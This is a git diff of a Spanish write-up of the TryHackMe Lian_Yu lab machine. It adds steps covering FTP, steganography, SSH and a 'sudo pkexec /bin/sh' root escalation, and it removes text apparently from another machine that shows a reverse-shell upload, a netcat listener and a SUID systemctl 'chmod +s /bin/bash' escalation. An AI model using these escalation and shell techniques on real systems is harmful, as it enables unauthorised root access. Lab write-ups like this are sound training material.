@@ -1,6 +1,6 @@
 ---
 title: TryHackMe Lian_Yu Writeup
-published: false
+published: true
 ---
 
 La máquina Lian_Yu, es una máquina de TryHackMe en la que mediante el seguimiento de la room en TryHackMe conseguiremos resolver una serie de preguntas que nos plantean:
@@ -160,7 +160,12 @@ Tras un tiempo intentando descodificarlo, lo consigo con base 58
 
 Teniendo en cuenta que esta es la contraseña FTP que nos piden, intentamos conectarnos por este medio con el name vigilante (conseguido anteriormente) y la contraseña que acabamos de conseguir
 
-Vemos tres ar
+Vemos tres archivos, nos los llevaremos a nuestro equipo con
+
+> get Leave_me_alone.png
+> get Queen's_Gambit.png
+> get aa.jpg
+
 
 ```bash
 ❯ ftp 10.10.231.51
@@ -181,161 +186,154 @@ ftp> ls
 226 Directory send OK.
 ```
 
-Con el escaneo de servicio y versiones podemos ver que la versión es la 3.5.12, que estamos frente a un Ubuntu y que el puerto por le que corre el servidor web es el 3333.
+Al hacer un file sobre Leave_me_alone nos muestra que es una imagen PNG. Sin embargo, al editarla con hexeditor me doy cuenta que los primeros dígitos no corresponden con el innicio de una imagen típica PNG. Cambio los primeros dígitos hexadecimales para que se traduzca en .PNG:
 
-Sabemos independientemente de esto que -n No aplica resolución DNS y que con -p-400 escaneará los 400 puertos más comunes.
+> 89 50 4E 47  0D 0A 1A 0A 
+
+Al abrir la imagen nos reporta una contraseña
+
+Puesto que tenemos dos archivos de imagen más, intendo extraer un posible contenido de estas mediante steghide:
+
+> steghide extract -sf Queen's_Gambit.png
+
+Parece que la contraseña no es la correcta, lo intantaré con la otra imagen:
+
+> steghide extract -sf aa.jpg
+
+Anoto la contraseña y nos reporta un archivo .zip
+
+Lo extreamos con 7z:
+
+> 7z x ss.zip
+
+```bash
+❯ 7z x ss.zip
+
+7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=es_ES.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs 11th Gen Intel(R) Core(TM) i5-11400F @ 2.60GHz (A0671),ASM,AES-NI)
+
+Scanning the drive for archives:
+1 file, 596 bytes (1 KiB)
+
+Extracting archive: ss.zip
+--
+Path = ss.zip
+Type = zip
+Physical Size = 596
+
+Everything is Ok
+
+Files: 2
+Size:       343
+Compressed: 596
+```
+
+Uno de los archivos no nos da información relevante pero el otro nos vuelve a reportar una potencial contraseña.
 
 # [](#header-1)Acceso al sistema 
 
-Para localizar los directorios ocultos usaremos gobuster:
+En la room de TryHackMe nos preguntan por el nombre del archivo que contiene la contraseña para conectarse mediante SSH. Ponemos el nombre del archivo que acabamos de abrir y es correcto. Nos da la información de que podemos conectarnos mediante SSH.
+
+Intento conectarme mediante SSH a la IP-VICTIMA como el usuario vigilante pero no me deja. Volviendo al servicio ftp veo que si me dirijo a /home hay otro usuario:
 
 ```bash
-❯ gobuster dir -u http://10.10.244.174:3333 -w /usr/share/wordlists/dirb/common.txt -t 25 -x php,html,txt
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://10.10.244.174:3333
-[+] Method:                  GET
-[+] Threads:                 25
-[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Extensions:              php,html,txt
-[+] Timeout:                 10s
-===============================================================
-2022/10/25 12:22:14 Starting gobuster in directory enumeration mode
-===============================================================
-/.htaccess            (Status: 403) [Size: 299]
-/.htaccess.html       (Status: 403) [Size: 304]
-/.htaccess.txt        (Status: 403) [Size: 303]
-/.htaccess.php        (Status: 403) [Size: 303]
-/.htpasswd            (Status: 403) [Size: 299]
-/.htpasswd.php        (Status: 403) [Size: 303]
-/.htpasswd.html       (Status: 403) [Size: 304]
-/.htpasswd.txt        (Status: 403) [Size: 303]
-/.hta                 (Status: 403) [Size: 294]
-/.hta.php             (Status: 403) [Size: 298]
-/.hta.html            (Status: 403) [Size: 299]
-/.hta.txt             (Status: 403) [Size: 298]
-/css                  (Status: 301) [Size: 319] [--> http://10.10.244.174:3333/css/]
-/fonts                (Status: 301) [Size: 321] [--> http://10.10.244.174:3333/fonts/]
-/images               (Status: 301) [Size: 322] [--> http://10.10.244.174:3333/images/]
-/index.html           (Status: 200) [Size: 33014]                                      
-/index.html           (Status: 200) [Size: 33014]                                      
-/internal             (Status: 301) [Size: 324] [--> http://10.10.244.174:3333/internal/]
-/js                   (Status: 301) [Size: 318] [--> http://10.10.244.174:3333/js/]      
-/server-status        (Status: 403) [Size: 303]                                          
-                                                                                         
-===============================================================
-2022/10/25 12:22:57 Finished
-===============================================================
-
+ftp> pwd
+Remote directory: /home/vigilante
+ftp> cd /home
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||42161|).
+150 Here comes the directory listing.
+drwx------    2 1000     1000         4096 May 01  2020 slade
+drwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante
+226 Directory send OK.
+ftp> 
 ```
-
-Buscando los directorios nos fijamos que el directorio /internal/ es el que presenta la página de subida de archivos.
-
-
-Por norma general, los archivos .php suelen estar restringidos. Probamos en TryHackMe y resolvemos la siguiente pregunta.
-
-Siguiendo los pasos de la room de TryHackMe, podemos observar que la extensión .phtml está permitida. 
-
-Entonces, nos bajaremos la reverse shell de la página que nos facilita TryHackMe cambiando la IP (que deberá de ser la nuestra) y el puerto por el que estemos a la escucha.
-
-Subimos la reverse shell y mientras estamos en escucha la ejecutamos desde /internal/uploads
+Intentaremos conectarnos por SSH con este usuario:
 
 ```bash
-❯ nc -lnvp 1234
-listening on [any] 1234 ...
-connect to [10.8.4.179] from (UNKNOWN) [10.10.244.174] 38976
-Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
- 12:27:07 up  1:49,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-/bin/sh: 0: can't access tty; job control turned off
-$ 
-```
-Conseguimos acceso a la máquina. Podemos ver el usuario de la siguiente manera: 
+❯ ssh slade@10.10.207.227
+The authenticity of host '10.10.207.227 (10.10.207.227)' can't be established.
+ED25519 key fingerprint is SHA256:DOqn9NupTPWQ92bfgsqdadDEGbQVHMyMiBUDa0bKsOM.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:19: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.207.227' (ED25519) to the list of known hosts.
+slade@10.10.207.227's password: 
+                              Way To SSH...
+                          Loading.........Done.. 
+                   Connecting To Lian_Yu  Happy Hacking
 
-```bash
-$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-$ cd /home  
-$ ls
-bill
-$ 
-```
+██╗    ██╗███████╗██╗      ██████╗ ██████╗ ███╗   ███╗███████╗██████╗ 
+██║    ██║██╔════╝██║     ██╔════╝██╔═══██╗████╗ ████║██╔════╝╚════██╗
+██║ █╗ ██║█████╗  ██║     ██║     ██║   ██║██╔████╔██║█████╗   █████╔╝
+██║███╗██║██╔══╝  ██║     ██║     ██║   ██║██║╚██╔╝██║██╔══╝  ██╔═══╝ 
+╚███╔███╔╝███████╗███████╗╚██████╗╚██████╔╝██║ ╚═╝ ██║███████╗███████╗
+ ╚══╝╚══╝ ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚══════╝╚══════╝
 
-Conseguimos la flag del usuario:
 
-```bash
-$ cd bill
-$ ls
+        ██╗     ██╗ █████╗ ███╗   ██╗     ██╗   ██╗██╗   ██╗
+        ██║     ██║██╔══██╗████╗  ██║     ╚██╗ ██╔╝██║   ██║
+        ██║     ██║███████║██╔██╗ ██║      ╚████╔╝ ██║   ██║
+        ██║     ██║██╔══██║██║╚██╗██║       ╚██╔╝  ██║   ██║
+        ███████╗██║██║  ██║██║ ╚████║███████╗██║   ╚██████╔╝
+        ╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝    ╚═════╝  #
+
+slade@LianYu:~$ pwd
+/home/slade
+slade@LianYu:~$ ls
 user.txt
-$ cat user.txt  
-?????????????????????????
+slade@LianYu:~$ cat user.txt
+THM{?????????????????????????}
+                        --Felicity Smoak
+
+slade@LianYu:~$ 
 ```
 
-# [](#header-1)Escalada de privilegios 
+Lo conseguimso y obtenemos la flag del usuario!
 
-Desde TryHackMe nos preguntan por archivos inusuales con permisos SUID. Para buscarlos haremos:
+# [](#header-1)Escalada de privilegios
+
+Hacemos sudo -l para ver que comandos podemos ejecutar como root y nos reporta lo siguiente:
 
 ```bash
-$ find / -type f -perm -4000 2>/dev/null
-/usr/bin/newuidmap
-/usr/bin/chfn
-/usr/bin/newgidmap
-/usr/bin/sudo
-/usr/bin/chsh
-/usr/bin/passwd
-/usr/bin/pkexec
-/usr/bin/newgrp
-/usr/bin/gpasswd
-/usr/bin/at
-/usr/lib/snapd/snap-confine
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/openssh/ssh-keysign
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/squid/pinger
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-/bin/su
-/bin/ntfs-3g
-/bin/mount
-/bin/ping6
-/bin/umount
----> /bin/systemctl
-/bin/bash
-/bin/ping
-/bin/fusermount
-/sbin/mount.cifs
-$ 
+slade@LianYu:~$ sudo -l
+[sudo] password for slade: 
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
 ```
 
-Observamos así el directorio inusual. Sabiendo que ese archivo tiene permisos SUID, buscamos en <a href="https://gtfobins.github.io/gtfobins/systemctl/"> GTFOBins </a> y conseguimos la forma de escalar privilegios. 
+NOs dirigimos a <a href="https://gtfobins.github.io/gtfobins/pkexec/" >GTFOBins</a> y vemos que podemos escalar privilegios con una simple línea de código:
 
-Únicamente deberemos introducir el comando chmod +s /bin/bash en el apartado de "id > /tmp/output"
+> sudo pkexec /bin/sh
 
-Por otro lado deberemos indicar la ruta absoluta de ./systemctl -> /bin/systemctl
-
-Una vez realizado, comprobamos si tenemos el permiso s con:
+Lo ejecutamos y conseguimos la flag de root!
 
 ```bash
-$ ls -l /bin/bash
--rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
-```
-
-Lo tenemos, hacemos bash -p para obtener la bash como root y conseguimos la flag de root.
-
-```bash
-$ bash -p
-id
-uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
-cd /root
-ls
+slade@LianYu:~$     sudo pkexec /bin/sh
+# whoami
+whoami: not found
+# ls
 root.txt
-cat root.txt
-???????????????????????
+# cat root.txt
+                          Mission accomplished
+
+
+
+You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 
+
+
+
+THM{??????????????????????????????????????????????????????????????????????????????????????}
+                                                                              --DEATHSTROKE
+
+Let me know your comments about this machine :)
+I will be available @twitter @User6825
+
 ```
 
 Muchas gracias por leer este writeup, espero que te haya gustado!
